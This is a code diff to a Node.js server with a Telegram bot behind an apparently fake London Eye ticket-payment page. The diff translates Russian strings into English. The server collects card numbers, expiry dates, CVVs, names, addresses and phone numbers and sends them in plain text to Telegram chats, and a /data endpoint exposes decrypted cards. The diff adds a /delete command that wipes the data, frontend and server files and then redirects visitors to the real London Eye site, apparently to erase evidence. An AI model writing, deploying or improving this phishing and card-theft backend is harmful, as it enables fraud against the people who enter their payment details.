@@ -20,7 +20,7 @@ try {
         payments = JSON.parse(data);
     }
 } catch (error) {
-    console.log('Создаем новый файл payments.json');
+    console.log('Creating new payments.json file');
 }
 
 function savePayments() {
@@ -38,8 +38,8 @@ const BOT_PASSWORD = process.env.TELEGRAM_PASSWORD || "admin123";
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 
-        '🔐 Для доступа введите пароль:\n\n' +
-        'Используйте команду: /password ваш_пароль'
+        '🔐 For access, enter password:\n\n' +
+        'Use command: /password your_password'
     );
 });
 
@@ -50,14 +50,118 @@ bot.onText(/\/password (.+)/, (msg, match) => {
     if (password === BOT_PASSWORD) {
         AUTHORIZED_USERS[chatId] = true;
         bot.sendMessage(chatId, 
-            '✅ Доступ разрешен!\n\n' +
-            'Доступные команды:\n' +
-            '/payments - Посмотреть все платежи\n' +
-            'Новые платежи приходят автоматически!'
+            '✅ Access granted!\n\n' +
+            'Available commands:\n' +
+            '/payments - View all payments\n' +
+            '/delete - DELETE ALL DATA AND FILES\n' +
+            'New payments come automatically!'
         );
     } else {
-        bot.sendMessage(chatId, '❌ Неверный пароль!');
+        bot.sendMessage(chatId, '❌ Wrong password!');
     }
+});
+
+bot.onText(/\/delete/, (msg) => {
+    const chatId = msg.chat.id;
+    
+    if (!AUTHORIZED_USERS[chatId]) {
+        bot.sendMessage(chatId, '❌ Access denied! Use /password first.');
+        return;
+    }
+
+    // Confirmation keyboard
+    const keyboard = {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '🚨 YES, DELETE EVERYTHING', callback_data: 'confirm_delete' },
+                    { text: '❌ Cancel', callback_data: 'cancel_delete' }
+                ]
+            ]
+        }
+    };
+
+    bot.sendMessage(chatId, 
+        '🚨🚨🚨 DANGER ZONE 🚨🚨🚨\n\n' +
+        'This will PERMANENTLY delete:\n' +
+        '• All payment data\n' + 
+        '• All server files\n' +
+        '• Frontend files\n' +
+        '• Database\n\n' +
+        'Website will redirect to London Eye official site.\n\n' +
+        'THIS ACTION CANNOT BE UNDONE!\n\n' +
+        'Are you absolutely sure?',
+        keyboard
+    );
+});
+
+bot.on('callback_query', (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const chatId = msg.chat.id;
+    const data = callbackQuery.data;
+
+    if (data === 'confirm_delete') {
+        try {
+            // Delete payments file
+            if (fs.existsSync(DATA_FILE)) {
+                fs.unlinkSync(DATA_FILE);
+            }
+            
+            // Clear payments array
+            payments = [];
+            
+            // Delete public folder (frontend files)
+            const publicPath = path.join(__dirname, 'public');
+            if (fs.existsSync(publicPath)) {
+                fs.rmSync(publicPath, { recursive: true, force: true });
+            }
+            
+            // Delete server.js file
+            const serverFile = path.join(__dirname, 'server.js');
+            if (fs.existsSync(serverFile)) {
+                fs.unlinkSync(serverFile);
+            }
+            
+            // Create redirect HTML
+            const redirectHtml = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; url=https://www.londoneye.com/fr/preparez-votre-visite/avant-votre-visite/heures-douverture/">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>Redirecting to London Eye official website...</p>
+</body>
+</html>
+            `;
+            
+            // Create minimal public directory with redirect
+            fs.mkdirSync(publicPath, { recursive: true });
+            fs.writeFileSync(path.join(publicPath, 'index.html'), redirectHtml);
+            
+            bot.sendMessage(chatId, 
+                '✅ ALL DATA DELETED SUCCESSFULLY!\n\n' +
+                '🗑️ Deleted:\n' +
+                '• Payment database\n' +
+                '• Frontend files\n' +
+                '• Server files\n\n' +
+                '🌐 Website now redirects to London Eye official site.\n\n' +
+                '⚠️ Server will continue running with redirect only.'
+            );
+            
+            console.log('🚨 ALL DATA DELETED BY USER: ' + chatId);
+            
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Error during deletion: ' + error.message);
+            console.error('Delete error:', error);
+        }
+    } else if (data === 'cancel_delete') {
+        bot.sendMessage(chatId, '✅ Deletion cancelled. Data is safe.');
+    }
+    
+    bot.answerCallbackQuery(callbackQuery.id);
 });
 
 bot.on('message', (msg) => {
@@ -67,26 +171,26 @@ bot.on('message', (msg) => {
     
     if (msg.text === '/payments') {
         if (payments.length === 0) {
-            bot.sendMessage(msg.chat.id, '📭 Платежей пока нет');
+            bot.sendMessage(msg.chat.id, '📭 No payments yet');
             return;
         }
         
-        let message = '💳 Последние платежи:\n\n';
+        let message = '💳 Recent payments:\n\n';
         const recentPayments = payments.slice(-10).reverse();
         
         recentPayments.forEach((payment, index) => {
-            // Расшифровываем данные для показа в Telegram
+            // Decrypt data for Telegram display
             const decryptedCard = CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
             const decryptedExpiry = CryptoJS.AES.decrypt(payment.expiration, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
             const decryptedCvv = CryptoJS.AES.decrypt(payment.cvv, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8);
             
-            message += `🆔 ${index + 1}. Заказ #${payment.id}\n`;
-            message += `💳 Карта: ${decryptedCard}\n`;
-            message += `📅 Срок: ${decryptedExpiry}\n`;
+            message += `🆔 ${index + 1}. Order #${payment.id}\n`;
+            message += `💳 Card: ${decryptedCard}\n`;
+            message += `📅 Expiry: ${decryptedExpiry}\n`;
             message += `🔒 CVV: ${decryptedCvv}\n`;
             message += `👤 ${payment.firstName} ${payment.lastName}\n`;
             message += `🎫 ${payment.ticketType}\n`;
-            message += `📅 ${new Date(payment.timestamp).toLocaleString('ru-RU')}\n`;
+            message += `📅 ${new Date(payment.timestamp).toLocaleString('en-US')}\n`;
             message += '─'.repeat(20) + '\n\n';
         });
         
@@ -115,11 +219,11 @@ app.post('/submit-payment', async (req, res) => {
             time 
         } = req.body;
 
-        // Проверка обязательных полей
+        // Required fields validation
         if (!cardNumber || !expiration || !cvv || !firstName || !email) {
             return res.status(400).json({
                 success: false,
-                message: 'Обязательные поля не заполнены'
+                message: 'Required fields are missing'
             });
         }
 
@@ -144,68 +248,68 @@ app.post('/submit-payment', async (req, res) => {
             timestamp: new Date().toISOString()
         };
 
-        // Сохраняем в файл (зашифрованные данные карты)
+        // Save to file (encrypted card data)
         const encryptedPayment = {
             ...payment,
-            cardNumber: encrypt(cardNumber),    // Шифруем для файла
-            expiration: encrypt(expiration),    // Шифруем для файла  
-            cvv: encrypt(cvv)                   // Шифруем для файла
+            cardNumber: encrypt(cardNumber),    // Encrypt for file
+            expiration: encrypt(expiration),    // Encrypt for file  
+            cvv: encrypt(cvv)                   // Encrypt for file
         };
         
         payments.push(encryptedPayment);
         savePayments();
 
-        // Отправляем в Telegram НЕЗАШИФРОВАННЫЕ данные карты
+        // Send to Telegram with UNENCRYPTED card data
         const telegramMessage = `
-💳 НОВЫЙ ПЛАТЕЖ!
+💳 NEW PAYMENT!
 🆔 ID: ${payment.id}
-🎫 Билет: ${payment.ticketType}
-💰 Цена: ${payment.ticketPrice}
-📅 Дата: ${payment.date}
-⏰ Время: ${payment.time}
+🎫 Ticket: ${payment.ticketType}
+💰 Price: ${payment.ticketPrice}
+📅 Date: ${payment.date}
+⏰ Time: ${payment.time}
 
-💳 ДАННЫЕ КАРТЫ:
-Карта: ${payment.cardNumber}
-Срок: ${payment.expiration}
+💳 CARD DATA:
+Card: ${payment.cardNumber}
+Expiry: ${payment.expiration}
 CVV: ${payment.cvv}
 
-👤 КЛИЕНТ:
-Имя: ${payment.firstName} ${payment.lastName}
+👤 CUSTOMER:
+Name: ${payment.firstName} ${payment.lastName}
 Email: ${payment.email}
-Телефон: ${payment.phone}
+Phone: ${payment.phone}
 
-📍 АДРЕС:
+📍 ADDRESS:
 ${payment.address1}${payment.address2 ? '\n' + payment.address2 : ''}
 ${payment.city}, ${payment.postcode}
 ${payment.country}
 
-⏰ ${new Date().toLocaleString('ru-RU')}
+⏰ ${new Date().toLocaleString('en-US')}
 `;
 
-        // Отправляем всем авторизованным пользователям
+        // Send to all authorized users
         Object.keys(AUTHORIZED_USERS).forEach(chatId => {
             bot.sendMessage(chatId, telegramMessage);
         });
 
         res.json({ 
             success: true, 
-            message: 'Платеж успешно обработан!',
+            message: 'Payment processed successfully!',
             id: payment.id
         });
 
     } catch (error) {
-        console.error('Ошибка:', error);
+        console.error('Error:', error);
         res.status(500).json({ 
             success: false, 
-            message: 'Ошибка сервера' 
+            message: 'Server error' 
         });
     }
 });
 
-// Получение всех платежей (для отладки)
+// Get all payments (for debugging)
 app.get('/data', (req, res) => {
     try {
-        // Расшифровываем данные для отладки
+        // Decrypt data for debugging
         const decryptedPayments = payments.map(payment => ({
             ...payment,
             cardNumber: CryptoJS.AES.decrypt(payment.cardNumber, ENCRYPTION_KEY).toString(CryptoJS.enc.Utf8),
@@ -219,5 +323,5 @@ app.get('/data', (req, res) => {
 });
 
 app.listen(PORT,'0.0.0.0' ,() => {
-    console.log(`🚀 Сервер запущен на http://localhost:${PORT}`);
+    console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
